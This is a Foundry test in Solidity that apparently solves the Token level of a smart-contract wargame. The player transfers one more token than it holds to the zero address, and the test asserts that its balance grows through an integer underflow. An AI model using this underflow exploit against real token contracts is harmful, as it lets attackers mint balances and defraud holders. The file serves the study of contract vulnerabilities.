// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Token} from "../src/05_Token.sol";

contract TestToken is Test {
    address public player = address(0xbad);
    address public bob = address(0xb0b);
    Token public instance;
    uint256 public constant initialPlayerBalance = 20;

    function setUp() public {
        vm.deal(player, 0.001 ether);
        vm.deal(bob, 0.001 ether);

        vm.startPrank(bob);
        instance = new Token(100);
        instance.transfer(player, initialPlayerBalance);
        vm.stopPrank();
    }

    function testSolution() public {
        vm.startPrank(player);

        instance.transfer(address(0), initialPlayerBalance + 1);
        assertGt(instance.balanceOf(player), initialPlayerBalance);

        vm.stopPrank();
    }
}
